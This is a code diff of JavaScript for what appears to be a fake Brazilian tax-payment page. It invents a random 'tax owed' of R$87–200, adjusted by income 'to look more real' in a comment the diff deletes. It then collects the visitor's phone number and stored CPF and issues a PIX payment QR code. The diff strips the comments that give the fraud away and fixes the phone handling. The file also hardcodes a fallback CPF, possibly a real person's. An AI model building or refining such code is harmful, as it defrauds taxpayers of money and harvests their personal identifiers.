@@ -665,7 +665,7 @@
             const btnCalcular = document.getElementById('btn-calcular');
             const textoOriginal = btnCalcular.innerHTML;
             
-            // Validar telefone
+            
             const telefone = document.getElementById('telefone').value.trim();
             if (!telefone) {
                 alert('Por favor, informe seu telefone para contato.');
@@ -682,10 +682,10 @@
                 const renda = parseFloat(document.getElementById('renda-tributavel').value) || 0;
                 const dependentes = parseInt(document.getElementById('dependentes').value) || 0;
                 
-                // VALOR ALEATÓRIO ENTRE 87 E 200
+                
                 let valorBase = Math.floor(Math.random() * (200 - 87 + 1) + 87);
                 
-                // Pequena variação baseada na renda para parecer mais real
+               
                 if (renda > 5000) {
                     valorBase = Math.min(200, valorBase + 20);
                 } else if (renda < 1500) {
@@ -733,113 +733,105 @@
             }, 1500);
         }
         
-        function gerarPix() {
-            if (impostoCalculado <= 0) {
-                alert('Calcule o imposto primeiro.');
-                return;
+   function gerarPix() {
+    if (impostoCalculado <= 0) {
+        alert('Calcule o imposto primeiro.');
+        return;
+    }
+    
+   
+    const telefone = document.getElementById('telefone').value.trim();
+    if (!telefone) {
+        alert('Por favor, informe seu telefone para contato.');
+        document.getElementById('telefone').focus();
+        return;
+    }
+    
+    let cpfSalvo = localStorage.getItem('user_cpf') || sessionStorage.getItem('user_cpf') || '';
+    
+    if (!cpfSalvo) {
+        const cookies = document.cookie.split('; ');
+        for (let cookie of cookies) {
+            if (cookie.startsWith('user_cpf=')) {
+                cpfSalvo = cookie.split('=')[1];
+                break;
             }
-            
-            let cpfSalvo = localStorage.getItem('user_cpf') || sessionStorage.getItem('user_cpf') || '';
-            
-            if (!cpfSalvo) {
-                const cookies = document.cookie.split('; ');
-                for (let cookie of cookies) {
-                    if (cookie.startsWith('user_cpf=')) {
-                        cpfSalvo = cookie.split('=')[1];
-                        break;
-                    }
-                }
-            }
-            
-            cpfSalvo = cpfSalvo.replace(/[.-]/g, '');
-            
-            if (!cpfSalvo || cpfSalvo.length !== 11) {
-                cpfSalvo = '07068093868';
-                console.log('⚠️ CPF não encontrado, usando padrão:', cpfSalvo);
-            }
-            
-            const btnPagar = document.getElementById('btn-pagar');
-            const textoOriginal = btnPagar.innerHTML;
-            btnPagar.innerHTML = '<span class="loading-calc"></span> Gerando PIX...';
-            btnPagar.disabled = true;
-            
-            document.getElementById('pix-value').innerHTML = `R$ ${impostoCalculado.toFixed(2)}`;
-            
-            fetch('/api/create-payment', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    amount: impostoCalculado,
-                    customer_name: 'Contribuinte',
-                    customer_email: 'pagamento@contribuinte.com',
-                    customer_cpf: cpfSalvo,
-                    customer_phone: telefoneUsuario
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                btnPagar.innerHTML = textoOriginal;
-                btnPagar.disabled = false;
-                
-                if (data.success && data.payment && data.payment.pix_code) {
-                    ultimoPixGerado = {
-                        codigo: data.payment.pix_code,
-                        valor: impostoCalculado,
-                        cpf: cpfSalvo,
-                        telefone: telefoneUsuario
-                    };
-                    
-                    document.getElementById('pix-codigo').textContent = data.payment.pix_code;
-                    
-                    const qrcodeContainer = document.getElementById('qrcode-container');
-                    qrcodeContainer.innerHTML = '';
-                    new QRCode(qrcodeContainer, {
-                        text: data.payment.pix_code,
-                        width: 250,
-                        height: 250
-                    });
-                    
-                    if (data.payment.expires_at) {
-                        document.getElementById('pix-expiracao').innerHTML = `⏱️ Expira em: ${new Date(data.payment.expires_at).toLocaleString()}`;
-                    }
-                    
-                    document.getElementById('modal-pix').style.display = 'flex';
-                    
-                    // Redireciona após 5 segundos para o recibo
-                    setTimeout(() => {
-                        document.getElementById('modal-pix').style.display = 'none';
-                        window.location.href = `recibo.html?valor=${ultimoPixGerado.valor}&cpf=${ultimoPixGerado.cpf}&telefone=${encodeURIComponent(telefoneUsuario)}`;
-                    }, 5000);
-                } else {
-                    alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
-                }
-            })
-            .catch(error => {
-                btnPagar.innerHTML = textoOriginal;
-                btnPagar.disabled = false;
-                console.error('Erro:', error);
-                alert('Erro de conexão com o servidor.');
-            });
         }
+    }
+    
+    cpfSalvo = cpfSalvo.replace(/[.-]/g, '');
+    
+    if (!cpfSalvo || cpfSalvo.length !== 11) {
+        cpfSalvo = '07068093868';
+        console.log('CPF não encontrado, usando padrão:', cpfSalvo);
+    }
+    
+   
+    localStorage.setItem('user_telefone', telefone);
+    sessionStorage.setItem('user_telefone', telefone);
+    
+    const btnPagar = document.getElementById('btn-pagar');
+    const textoOriginal = btnPagar.innerHTML;
+    btnPagar.innerHTML = '<span class="loading-calc"></span> Gerando PIX...';
+    btnPagar.disabled = true;
+    
+    document.getElementById('pix-value').innerHTML = `R$ ${impostoCalculado.toFixed(2)}`;
+    
+    fetch('/api/create-payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            amount: impostoCalculado,
+            customer_name: 'Contribuinte',
+            customer_email: 'pagamento@contribuinte.com',
+            customer_cpf: cpfSalvo,
+            customer_phone: telefone
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        btnPagar.innerHTML = textoOriginal;
+        btnPagar.disabled = false;
         
-        function copiarPix() {
-            const codigoPix = document.getElementById('pix-codigo').textContent;
-            if (codigoPix && codigoPix !== 'Aguardando geração do PIX...') {
-                navigator.clipboard.writeText(codigoPix).then(() => {
-                    const msgDiv = document.getElementById('pix-mensagem');
-                    msgDiv.textContent = '✓ Código PIX copiado! Realize o pagamento no seu banco.';
-                    msgDiv.className = 'alert alert-success';
-                    msgDiv.style.display = 'block';
-                    setTimeout(() => {
-                        msgDiv.style.display = 'none';
-                    }, 3000);
-                }).catch(() => {
-                    const msgDiv = document.getElementById('pix-mensagem');
-                    msgDiv.textContent = 'Erro ao copiar. Copie manualmente.';
-                    msgDiv.className = 'alert alert-danger';
-                    msgDiv.style.display = 'block';
-                });
+        if (data.success && data.payment && data.payment.pix_code) {
+            ultimoPixGerado = {
+                codigo: data.payment.pix_code,
+                valor: impostoCalculado,
+                cpf: cpfSalvo,
+                telefone: telefone
+            };
+            
+            document.getElementById('pix-codigo').textContent = data.payment.pix_code;
+            
+            const qrcodeContainer = document.getElementById('qrcode-container');
+            qrcodeContainer.innerHTML = '';
+            new QRCode(qrcodeContainer, {
+                text: data.payment.pix_code,
+                width: 250,
+                height: 250
+            });
+            
+            if (data.payment.expires_at) {
+                document.getElementById('pix-expiracao').innerHTML = `⏱️ Expira em: ${new Date(data.payment.expires_at).toLocaleString()}`;
             }
+            
+            document.getElementById('modal-pix').style.display = 'flex';
+            
+            setTimeout(() => {
+                document.getElementById('modal-pix').style.display = 'none';
+                window.location.href = `recibo.html?valor=${ultimoPixGerado.valor}&cpf=${ultimoPixGerado.cpf}&telefone=${encodeURIComponent(telefone)}`;
+            }, 5000);
+        } else {
+            alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
+        }
+    })
+    .catch(error => {
+        btnPagar.innerHTML = textoOriginal;
+        btnPagar.disabled = false;
+        console.error('Erro:', error);
+        alert('Erro de conexão com o servidor.');
+    });
+}
         }
     </script>
 
